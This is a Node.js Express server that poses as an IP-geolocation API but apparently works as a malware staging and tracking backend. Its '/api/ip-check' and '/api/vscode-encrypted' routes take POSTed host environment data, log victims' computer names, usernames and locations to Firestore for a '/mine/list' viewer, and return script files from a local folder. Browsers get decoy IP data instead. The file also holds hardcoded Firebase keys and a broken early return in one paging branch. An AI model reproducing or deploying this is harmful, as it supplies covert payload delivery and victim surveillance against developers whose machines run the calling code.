const express = require("express");
const fs = require("fs");
const fsp = require("fs/promises");
const path = require("path");
const cors = require("cors");
const dotenv = require("dotenv");
const rateLimit = require("express-rate-limit");
const axios = require("axios");
const requestIp = require("request-ip");

const { isBanned } = require("./middleware/ipBlocker");
const { logBlockedRequest } = require("./middleware/logger");

const { initializeApp } = require("firebase/app");
const {
  getFirestore,
  collection,
  addDoc,
  deleteDoc,
  doc,
  getDocs,
  query,
  orderBy,
  limit,
  startAfter,
  endBefore,
  limitToLast,
  documentId,
} = require("firebase/firestore");

dotenv.config();
const app = express();

const SECRET_HEADER_VALUE = process.env.SECRET_HEADER_VALUE || "secret";
const port = process.env.PORT || 4000;

app.set("trust proxy", false);

app.use(cors());
app.use(requestIp.mw());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

const generalLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,
  max: 50,
  standardHeaders: true,
  legacyHeaders: false,
  message: { status: 429, error: "Too many requests, try again later." },
  skip: (req) => req.headers["x-secret-header"] === SECRET_HEADER_VALUE,
});
app.use(generalLimiter);

// Ban check
app.use((req, res, next) => {
  if (isBanned(req.clientIp)) {
    logBlockedRequest(req.clientIp, "IP banned");
    return res.status(403).json({ error: "Access denied." });
  }
  next();
});

// Firebase (gmail-lost)
// const firebaseConfig = {
//   apiKey: "AIzaSyBt3xmDNOxSKuWyeikaLqxUnZBXBwudXVQ",
//   authDomain: "locate-my-ip-4ce83.firebaseapp.com",
//   projectId: "locate-my-ip-4ce83",
//   storageBucket: "locate-my-ip-4ce83.firebasestorage.app",
//   messagingSenderId: "21940563761",
//   appId: "1:21940563761:web:e9c90c537c8b42ccca0a10"
// };
// open credential with 7team
// const firebaseConfig = {
//   apiKey: "AIzaSyDvO8xgmcDmHG1gw5n5NYdNbsvEj2_etLM",
//   authDomain: "ip-check-8ca7e.firebaseapp.com",
//   projectId: "ip-check-8ca7e",
//   storageBucket: "ip-check-8ca7e.firebasestorage.app",
//   messagingSenderId: "243651616930",
//   appId: "1:243651616930:web:f289e4f1d21d9f27e1f7fb"
// };

const firebaseConfig = {
  apiKey: "AIzaSyCsLFNcBmAmVAkIcsdeUETH0wmJstLjYcQ",
  authDomain: "geo-info-b7fa4.firebaseapp.com",
  projectId: "geo-info-b7fa4",
  storageBucket: "geo-info-b7fa4.firebasestorage.app",
  messagingSenderId: "1014074057981",
  appId: "1:1014074057981:web:7bc7ee4315b79285564a94"
};

// Initialize Firebase
const firebaseApp = initializeApp(firebaseConfig);
const db = getFirestore(firebaseApp);

// ---------- SSE (realtime push) ----------
const sseClients = new Set();

function sseSend(res, event, data) {
  res.write(`event: ${event}\n`);
  res.write(`data: ${JSON.stringify(data)}\n\n`);
}
function broadcast(event, data) {
  for (const res of sseClients) {
    try { sseSend(res, event, data); } catch {}
  }
}

app.get("/api/stream", (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders?.();

  sseSend(res, "hello", { ok: true, ts: Date.now() });
  sseClients.add(res);

  const ping = setInterval(() => {
    try { sseSend(res, "ping", { ts: Date.now() }); } catch {}
  }, 20000);

  req.on("close", () => {
    clearInterval(ping);
    sseClients.delete(res);
  });
});

// Helpers
function getLastPart(rBody) {
  const input = rBody?.npm_package_version || "21";
  try {
    if (typeof input !== "string") return "21";
    const parts = input.split(".");
    return parts.length > 0 ? parts[parts.length - 1] : "21";
  } catch {
    return "21";
  }
}

const decryptApiKeyToFileName = (apiKey) => {
  try {
    if (typeof apiKey !== "string") return "21";
    return apiKey.slice(-1) || "21";
  } catch {
    return "21";
  }
};

// IP API cache (TTL)
const ipCache = new Map();
const IP_CACHE_TTL_MS = 10 * 60 * 1000;

async function getIpDetailsCached(ip) {
  const now = Date.now();
  const cached = ipCache.get(ip);
  if (cached && cached.expiresAt > now) return cached.data;

  const resp = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 4000 });
  ipCache.set(ip, { expiresAt: now + IP_CACHE_TTL_MS, data: resp.data });
  return resp.data;
}

// ----------------------------
// Logging middleware (optimized)
// ----------------------------
app.use(async (req, res, next) => {
  const requestUrl = req.originalUrl;

  // Skip viewer + paging + assets so the page loads fast
  if (
    requestUrl === "/mine/list" ||
    requestUrl === "/mine/delete" ||
    requestUrl.startsWith("/api/requests") ||
    requestUrl.startsWith("/api/stream") ||
    requestUrl.startsWith("/favicon") ||
    requestUrl.startsWith("/assets") ||
    requestUrl.startsWith("/public")
  ) {
    return next();
  }

  const secretHeader = req.headers["x-secret-header"];
  const clientIp = req.clientIp;
  const requestMethod = req.method;
  const userAgent = req.headers["user-agent"] || "";
  const isPostman = userAgent.toLowerCase().includes("postman") || req.headers["postman-token"];

  const isBrowserOrPostman =
    userAgent.includes("Mozilla") ||
    userAgent.includes("Chrome") ||
    userAgent.includes("Safari") ||
    userAgent.includes("Edge") ||
    isPostman;

  const timestamp = new Date().toLocaleString("en-US", {
    timeZone: "Asia/Tokyo",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false,
  }).replace(
    /(\d{2})\/(\d{2})\/(\d{4}),\s(\d{2}):(\d{2}):(\d{2})/,
    "$3/$1/$2 $4:$5:$6"
  );

  try {
    const ipDetails = await getIpDetailsCached(clientIp);
    const { country = "none", regionName = "none", city = "none" } = ipDetails;

    if (requestUrl !== "/favicon.ico" && requestUrl !== "/favicon.png") {
      const logData = {
        country,
        regionName,
        city,
        method: secretHeader ? `${requestMethod}:${secretHeader}` : requestMethod,
        ip: clientIp,
        url: requestUrl,
        timestamp,
        source: isPostman ? "Postman" : "Web",
      };

      let fileName = "21";
      const urlSplitter = requestUrl.split("/");
      const apiKey = urlSplitter.length ? urlSplitter[urlSplitter.length - 1] : "";

      if (apiKey === "208") {
        fileName = getLastPart(req.body);
        if (requestMethod === "POST" && requestUrl.startsWith("/api/ip-check/")) {
          const computername = req.body.COMPUTERNAME || req.body.HOSTNAME || "Unknown";
          const userName = req.body.USER || req.body.LOGNAME || req.body.USERNAME || "Unknown";
          logData.computername = `${computername} | ${userName}`;
        }
      } else {
        fileName = decryptApiKeyToFileName(apiKey);
        if (
          requestMethod === "POST" &&
          (requestUrl.startsWith("/api/ip-check-encrypted/") ||
            requestUrl.startsWith("/api/vscode-encrypted/"))
        ) {
          const computername = req.body.COMPUTERNAME || req.body.HOSTNAME || "Unknown";
          const userName = req.body.USER || req.body.LOGNAME || req.body.USERNAME || "Unknown";
          logData.computername = `${computername} | ${userName}`;
        }
      }

      logData.flag = fileName;

      if (!isNaN(logData.flag) && logData.method === "POST:secret") {
        addDoc(collection(db, "requests"), logData)
          .then((docRef) => {
            // realtime notify viewer
            broadcast("new_log", { id: docRef.id, ...logData });
          })
          .catch((e) => console.error("Firestore log failed:", e?.message || e));
      }
    }

    if (isBrowserOrPostman) return res.json({ ipInfo: ipDetails });
  } catch (err) {
    return res.status(403).json({
      ipInfo: { query: clientIp, message: "Unable to fetch IP details." },
      error: err?.message || err,
    });
  }

  next();
});

// ----------------------------
// Cursor helpers (base64 JSON)
// ----------------------------
function encodeCursor(t, id) {
  const json = JSON.stringify({ t, id });
  return Buffer.from(json, "utf8").toString("base64");
}
function decodeCursor(cursor) {
  try {
    const json = Buffer.from(cursor, "base64").toString("utf8");
    const obj = JSON.parse(json);
    if (!obj || typeof obj.t !== "string" || typeof obj.id !== "string") return null;
    return obj;
  } catch {
    return null;
  }
}
function lower(v) { return (v ?? "").toString().toLowerCase(); }

// Server-side substring filters across ALL pages
function matchesAllFilters(data, f, hideMineList) {
  if (hideMineList && data.url === "/mine/list") return false;

  const ts = lower(data.timestamp);
  const country = lower(data.country);
  const regionName = lower(data.regionName);
  const city = lower(data.city);
  const method = lower(data.method);
  const source = lower(data.source);
  const ip = lower(data.ip);
  const url = lower(data.url);
  const flag = lower(data.flag);
  const computername = lower(data.computername);

  if (f.timestamp && !ts.includes(f.timestamp)) return false;
  if (f.country && !country.includes(f.country)) return false;
  if (f.regionName && !regionName.includes(f.regionName)) return false;
  if (f.city && !city.includes(f.city)) return false;
  if (f.method && !method.includes(f.method)) return false;
  if (f.source && !source.includes(f.source)) return false;
  if (f.ip && !ip.includes(f.ip)) return false;
  if (f.url && !url.includes(f.url)) return false;
  if (f.flag && !flag.includes(f.flag)) return false;
  if (f.computername && !computername.includes(f.computername)) return false;

  return true;
}

function hasAnyFilter(f, hideMineList) {
  if (hideMineList) return true;
  return Object.values(f).some(Boolean);
}

// ----------------------------
// Firestore paging API
// GET /api/requests?dir=first|next|prev|last&limit=200&cursor=...&hideMineList=1&...filters...
// ----------------------------
app.get("/api/requests", async (req, res) => {
  try {
    const pageSize = Math.max(1, Math.min(parseInt(req.query.limit || "200", 10), 2000));
    const dir = (req.query.dir || "first").toString();
    const cursor = typeof req.query.cursor === "string" ? req.query.cursor : null;
    const decoded = cursor ? decodeCursor(cursor) : null;

    const hideMineList = req.query.hideMineList === "1";

    const f = {
      timestamp: lower(req.query.timestamp),
      country: lower(req.query.country),
      regionName: lower(req.query.regionName),
      city: lower(req.query.city),
      method: lower(req.query.method),
      source: lower(req.query.source),
      ip: lower(req.query.ip),
      url: lower(req.query.url),
      flag: lower(req.query.flag),
      computername: lower(req.query.computername),
    };

    const base = [
      orderBy("timestamp", "desc"),
      orderBy(documentId(), "desc"),
    ];

    // -------- FAST PATH (no filters) --------
    // Do not scan windows; just return a normal Firestore page.
    if (!hasAnyFilter(f, hideMineList)) {
      let q;

      if (dir === "first") {
        q = query(collection(db, "requests"), ...base, limit(pageSize));
      } else if (dir === "next") {
        q = decoded
          ? query(collection(db, "requests"), ...base, startAfter(decoded.t, decoded.id), limit(pageSize))
          : query(collection(db, "requests"), ...base, limit(pageSize));
      } else if (dir === "prev") {
        q = decoded
          ? query(collection(db, "requests"), ...base, endBefore(decoded.t, decoded.id), limitToLast(pageSize))
          : query(collection(db, "requests"), ...base, limit(pageSize));
      } else if (dir === "last") {
        q = query(collection(db, "requests"), ...base, limitToLast(pageSize));
      } else {
        q = query(collection(db, "requests"), ...base, limit(pageSize));
      }

      const snapshot = await db.collection("request").get();
      console.log("Empty:", snapshot.empty);

      console.log("Size:", snapshot.size); return;

      const snap = await getDocs(q);
      const items = snap.docs.map(d => ({ id: d.id, ...d.data() }));

      const firstDoc = snap.docs[0] || null;
      const lastDoc = snap.docs[snap.docs.length - 1] || null;

      // Heuristic: null when “obviously first/last”; otherwise allow and frontend will disable if empty.
      const prevCursor = (dir === "first" || !firstDoc) ? null : encodeCursor(firstDoc.data().timestamp || "", firstDoc.id);
      const nextCursor = (dir === "last" || !lastDoc || snap.size < pageSize) ? null : encodeCursor(lastDoc.data().timestamp || "", lastDoc.id);

      return res.json({ items, prevCursor, nextCursor });
    }

    // -------- FILTERED PATH (adaptive scanning) --------
    // We scan Firestore in batches until we collect pageSize matching rows.
    let results = [];
    let loops = 0;
    const MAX_LOOPS = 40;

    let batchSize = Math.min(1000, Math.max(pageSize, 200)); // start small
    let scanDir = dir;
    let boundary = decoded;

    let scannedFirstRaw = null; // newest doc in the scanned region
    let scannedLastRaw = null;  // oldest doc in the scanned region
    let exhausted = false;

    while (results.length < pageSize && loops < MAX_LOOPS) {
      loops++;

      let q;
      if (scanDir === "first") {
        q = query(collection(db, "requests"), ...base, limit(batchSize));
      } else if (scanDir === "next") {
        q = boundary
          ? query(collection(db, "requests"), ...base, startAfter(boundary.t, boundary.id), limit(batchSize))
          : query(collection(db, "requests"), ...base, limit(batchSize));
      } else if (scanDir === "prev") {
        q = boundary
          ? query(collection(db, "requests"), ...base, endBefore(boundary.t, boundary.id), limitToLast(batchSize))
          : query(collection(db, "requests"), ...base, limit(batchSize));
      } else if (scanDir === "last") {
        q = query(collection(db, "requests"), ...base, limitToLast(batchSize));
      } else {
        q = query(collection(db, "requests"), ...base, limit(batchSize));
      }

      const snap = await getDocs(q);
      if (snap.empty) { exhausted = true; break; }
      if (snap.size < batchSize) exhausted = true;

      const docs = snap.docs;
      const firstDoc = docs[0];
      const lastDoc = docs[docs.length - 1];

      const firstRaw = { t: (firstDoc.data().timestamp || ""), id: firstDoc.id };
      const lastRaw  = { t: (lastDoc.data().timestamp || ""), id: lastDoc.id };

      if (!scannedFirstRaw) scannedFirstRaw = firstRaw;
      scannedLastRaw = lastRaw;

      for (const d of docs) {
        if (results.length >= pageSize) break;
        const data = d.data();
        if (matchesAllFilters(data, f, hideMineList)) {
          results.push({ id: d.id, ...data });
        }
      }

      // advance window
      if (dir === "first" || dir === "next") {
        scanDir = "next";
        boundary = lastRaw;   // older
      } else { // prev or last
        scanDir = "prev";
        boundary = firstRaw;  // newer
      }

      // gently grow batch if filters are strict
      if (results.length < pageSize && loops >= 2 && batchSize < 2000) {
        batchSize = Math.min(2000, Math.floor(batchSize * 1.35));
      }

      if (exhausted) break;
    }

    // cursors for navigation:
    // - prevCursor uses FIRST RAW doc of this page region (to go newer)
    // - nextCursor uses LAST  RAW doc of this page region (to go older)
    let prevCursor = null;
    let nextCursor = null;

    if (scannedFirstRaw && dir !== "first") prevCursor = encodeCursor(scannedFirstRaw.t, scannedFirstRaw.id);
    if (scannedLastRaw && dir !== "last")  nextCursor = exhausted ? null : encodeCursor(scannedLastRaw.t, scannedLastRaw.id);

    if (dir === "first") prevCursor = null;
    if (dir === "last")  nextCursor = null;

    return res.json({ items: results, prevCursor, nextCursor });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Failed to fetch requests", details: e?.message || e });
  }
});

// ----------------------------
// File routes
// ----------------------------
async function readFileFrom10Folder(fileName) {
  const filePath = path.join(process.cwd(), "10", fileName);
  await fsp.access(filePath, fs.constants.F_OK);
  return await fsp.readFile(filePath, "utf-8");
}

app.post("/api/ip-check/:filename", async (req, res) => {
  try {
    const fileName = req.params.filename === "v1" ? "v1" : getLastPart(req.body);
    if (fileName === "v1") return res.status(400).json('console.log("Development server started...")');
    const content = await readFileFrom10Folder(fileName);
    return res.send(content);
  } catch (e) {
    return res.status(404).json({ error: "IP check failed.", details: e?.message || e });
  }
});

app.post("/api/ip-check-encrypted/:filename", async (req, res) => {
  try {
    const fileName = req.params.filename === "v1" ? "v1" : decryptApiKeyToFileName(req.params.filename);
    if (fileName === "v1") return res.status(400).json('console.log("Development server started...")');
    const content = await readFileFrom10Folder(fileName);
    return res.send(content);
  } catch (e) {
    return res.status(500).json({ error: "Internal server error.", details: e?.message || e });
  }
});

app.post("/api/vscode-encrypted/:filename", async (req, res) => {
  try {
    const fileName = req.params.filename === "v1" ? "v1" : decryptApiKeyToFileName(req.params.filename);
    if (fileName === "v1") return res.status(400).json('console.log("Development server started...")');
    const content = await readFileFrom10Folder(fileName);
    return res.send(content);
  } catch (e) {
    return res.status(500).json({ error: "Internal server error.", details: e?.message || e });
  }
});

// Viewer page
app.get("/mine/list", async (req, res) => {
  try {
    if (!db) throw new Error("Database not initialized");
    return res.sendFile(path.join(__dirname, "views", "list.html"));
  } catch (err) {
    console.error("Server-side error:", err);
    res.status(500).json({ error: "Failed to retrieve logs.", details: err.message });
  }
});

// Delete selected logs (unchanged)
app.post("/mine/delete", async (req, res) => {
  const deleteIds = req.body.deleteIds;

  if (!deleteIds || (Array.isArray(deleteIds) && deleteIds.length === 0)) {
    return res.status(400).json({ error: "No records selected for deletion." });
  }

  const ids = Array.isArray(deleteIds) ? deleteIds : [deleteIds];

  try {
    await Promise.all(ids.map((id) => deleteDoc(doc(db, "requests", id))));
    res.redirect("/mine/list");
  } catch (err) {
    res.status(500).json({ error: "Failed to delete records.", details: err.message });
  }
});

app.listen(port, () => {
  console.log(`Listening on port ${port}`);
});

module.exports = app;
